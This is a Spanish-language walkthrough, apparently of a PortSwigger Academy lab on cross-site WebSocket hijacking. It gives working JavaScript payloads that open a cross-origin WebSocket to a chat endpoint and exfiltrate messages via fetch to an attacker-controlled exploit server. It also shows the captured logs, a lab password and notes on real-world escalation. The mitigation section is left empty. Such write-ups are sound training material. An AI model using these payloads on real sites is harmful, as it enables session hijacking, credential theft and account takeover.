---
title: "Cross site WebSocket hijacking"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "cross-site-websocket-hijacking"
author: "Z4k7"
date: "2026-04-08"
year: "2026"
status: "pwned"
tags:
  - "cswsh"
  - "csrf"
  - "exfiltration"
techniques:
  - "Cross-site WebSocket hijacking"
  - "Data exfiltration"
  - "Base64 encoding"
  - "JavaScript WebSocket API"
  - "Fetch API"
tools:
  - "Burp Suite"
  - "Exploit Server"
  - "Browser DevTools"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de PortSwigger Academy sobre Cross-site WebSocket Hijacking (CSWSH). Objetivo: crear un payload HTML/JavaScript que establezca una conexión WebSocket cross-origin, capture el historial de chat de la víctima, exfiltre los datos via fetch a un servidor atacante, decodifique los mensajes Base64 para extraer credenciales, y use esas credenciales para acceder a la cuenta de la víctima. Cadena de ataque: CSRF en handshake WebSocket → captura bidireccional de mensajes → exfiltración → credential theft.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Esta tienda online dispone de una función de chat en directo implementada mediante WebSockets.
          Para resolver el laboratorio, utilice el servidor de explotación para alojar una carga útil HTML/JavaScript que utilice un ataque de secuestro de WebSocket entre sitios para extraer el historial de chat de la víctima y, a continuación, utilice esto para obtener acceso a su cuenta.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se accede al laboratorio y se identifica una tienda online con función de chat en directo implementada mediante WebSockets.
          El objetivo es explotar CSWSH para extraer el historial de chat de la víctima y obtener sus credenciales.
          Hallazgos iniciales:
      - kind: "bullet"
        text: "Chat disponible mediante WebSocket"
      - kind: "bullet"
        text: "Estructura de mensajes: {'user':'nombre','content':'mensaje'}"
      - kind: "bullet"
        text: "Endpoint WebSocket: wss://0a29001103d18cbf838123a500f20065.web-security-academy.net/chat"
      - kind: "bullet"
        text: "No hay validación de origen (Origin header no validado)"
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409114145315.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409114210539.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En CSWSH, el handshake WebSocket es HTTP — por eso funciona cross-origin. El servidor NO valida el header `Origin` en la solicitud de upgrade. Esto significa que desde cualquier dominio, puedo ejecutar `new WebSocket('wss://target.com/chat')` y el servidor aceptará la conexión en el contexto de sesión de la víctima (sus cookies). Sin esta validación, CSWSH es trivial."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Se consulta el estado de concepto del envío de mensajes y la respuesta del WebSocket.
          Estructura de mensaje analizada:
      - kind: "code"
        lang: "JSON"
        code: |
          {"user":"Hal Pline","content":"Hello, how can I help?"}
      - kind: "note"
        text: |
          Se identifica que:
      - kind: "bullet"
        text: "Los mensajes se envían como JSON"
      - kind: "bullet"
        text: "Cada mensaje tiene estructura user + content"
      - kind: "bullet"
        text: "Los mensajes se reflejan a todos los usuarios conectados sin sanitización"
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409113444340.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "warning"
        label: "WebSocket sin validación de origen"
        text: "El servidor no valida el header `Origin` en el WebSocket upgrade request. Esto es la vulnerabilidad crítica. Cualquier página en cualquier dominio puede ejecutar `new WebSocket('wss://target.com/...')` y la conexión será aceptada con la sesión de la víctima."

  - id: "exploit"
    num: "04"
    title: "Paso 1: Crear payload HTML/JavaScript en Exploit Server"
    content:
      - kind: "note"
        text: |
          Se accede al Exploit Server (simulador de servidor atacante):
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409113559709.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se crea un payload JavaScript que:
          1. Abre una conexión WebSocket con el servidor vulnerable
          2. Escucha todos los mensajes recibidos
          3. Exfiltra cada mensaje hacia el servidor atacante
          Primer intento (fallido):
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          var ws = new WebSocket('wss://0a29001103d18cbf838123a500f20065.web-security-academy.net');
          ws.onopen = function() {
          	ws.send("READY");
          };
          ws.onmessage = function(event) {
          	fetch('https://exploit-0abd004b03f78c5683a822e901010090.exploit-server.net/exploit', {
          		method: 'POST',
          		mode: 'no-cors',
          		body: event.data
          	});
          };
          </script>
      - kind: "note"
        text: |
          Este payload no funcionó porque el endpoint WebSocket es `/chat`, no `/`.

  - id: "step5"
    num: "05"
    title: "Paso 2: Corregir endpoint y agregar encoding"
    content:
      - kind: "note"
        text: |
          Se corrige el endpoint a `/chat` y se agrega Base64 encoding para transmitir datos limpios:
          Segundo intento (exitoso):
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          var ws = new WebSocket('wss://0a29001103d18cbf838123a500f20065.web-security-academy.net/chat');
          
          ws.onopen = function() {
          	ws.send("READY");
          };
          
          ws.onmessage = function(event) {
          	fetch("https://exploit-0abd004b03f78c5683a822e901010090.exploit-server.net/exploit?mensaje="+btoa(event.data))
          };
          </script>
      - kind: "note"
        text: |
          Cambios clave:
      - kind: "bullet"
        text: "Endpoint correcto: /chat"
      - kind: "bullet"
        text: "btoa(event.data) — codifica en Base64 para transmisión limpia"
      - kind: "bullet"
        text: "Parámetro GET en lugar de POST — más simple de exfiltrar y leer en logs"
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409113624970.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validación de datos exfiltrados:
          El servidor de exploits registra cada request con los datos Base64:
      - kind: "code"
        lang: "BASH"
        code: |
          10.0.3.140      2026-04-09 02:12:49 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== HTTP/1.1" 200
          10.0.3.140      2026-04-09 02:12:49 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1" 200
          10.0.3.140      2026-04-09 02:12:49 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgNTdjajgzdGRpeWJ5OHFhZTcxYW0ifQ== HTTP/1.1" 200
          10.0.3.140      2026-04-09 02:12:49 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9 HTTP/1.1" 200

  - id: "access"
    num: "06"
    title: "Paso 3: Decodificar Base64 para extraer credenciales"
    content:
      - kind: "note"
        text: |
          Se decodifican los mensajes Base64:
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409114024957.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Mensajes decodificados:
      - kind: "code"
        lang: "JSON"
        code: |
          {"user":"Hal Pline","content":"Hello, how can I help?"}
          {"user":"You","content":"I forgot my password"}
          {"user":"Hal Pline","content":"No problem carlos, it's 57cj83tdiyby8qae71am"}
          {"user":"You","content":"Thanks, I hope this doesn't come back to bite me!"}
          {"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
      - kind: "note"
        text: |
          Credenciales extraídas:
      - kind: "bullet"
        text: "Usuario: carlos"
      - kind: "bullet"
        text: "Contraseña: 57cj83tdiyby8qae71am"

  - id: "access_1"
    num: "07"
    title: "Paso 4: Usar credenciales para acceder a la cuenta"
    content:
      - kind: "note"
        text: |
          Se ingresan las credenciales obtenidas:
      - kind: "image"
        src: "assets/images/Cross-site_WebSocket_hijacking/file-20260409114048837.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Acceso a Cuenta de Víctima Exitoso"
        text: "El ataque CSWSH capturó el historial completo del chat, incluida una conversación privada donde un agente de soporte reveló la contraseña. Esto ilustra el impacto bidireccional de CSWSH — a diferencia de CSRF clásico, el atacante puede leer las respuestas del servidor completas y exfiltrar datos sensibles transmitidos a través de WebSocket."

  - id: "exploit_1"
    num: "08"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El acceso a la cuenta de la víctima se logra exitosamente usando las credenciales extraídas del historial de chat.
          Usuario: `carlos`
          Contraseña: `57cj83tdiyby8qae71am`
          El lab se resuelve cuando se accede a la cuenta autenticado como `carlos`.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En un escenario real, podrías escalar esto: (1) si `carlos` es admin, accedes a panel administrativo, (2) si hay datos financieros, los exfiltraste, (3) podrías mantener el hijack abierto para capturar futuras conversaciones de cualquier usuario que se conecte. CSWSH es persistente mientras la página del atacante esté abierta."

  - id: "privesc_1"
    num: "09"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no requiere escalada de privilegios adicionales — el objetivo era acceso a cuenta de víctima, ya logrado.
          En escenario real, después de comprometer `carlos`, buscarías:
      - kind: "bullet"
        text: "¿Es carlos admin?"
      - kind: "bullet"
        text: "¿Tiene acceso a datos financieros o PII?"
      - kind: "bullet"
        text: "¿Hay otras cuentas con privilegios conectadas al chat?"
      - kind: "callout"
        type: "danger"
        label: "Impacto Potencial de CSWSH"
        text: "(1) Robo de datos confidenciales en tiempo real — cualquier conversación en el chat es capturada, (2) Suplantación de identidad — envías mensajes como la víctima, (3) Persistencia — el hijack permanece abierto mientras la página del atacante está cargada, (4) Escalación — si victima es admin, accedes a funcionalidades admin."

lessons:
  - 'WebSocket handshake es HTTP: Las cookies de sesión se envían automáticamente. Sin validación de `Origin`, cualquier sitio puede etablcer conexión.'
  - 'CSWSH = CSRF bidireccional: A diferencia de CSRF clásico (ciego), CSWSH permite leer respuestas y exfiltrar datos.'
  - 'Base64 es ideal para exfiltración: Codifica datos JSON limpios, evita caracteres especiales en URL, facilita la transmisión via GET.'
  - 'Historial de chat = datos sensibles: Conversaciones pueden contener credenciales, tokens, información personal — proteger con CSRF tokens en handshake.'
  - '`btoa()` + query parameters: Método simple y efectivo para exfiltrar datos desde JavaScript sin headers complejos.'
mitigation: 'Completar mitigaciones recomendadas.'
---
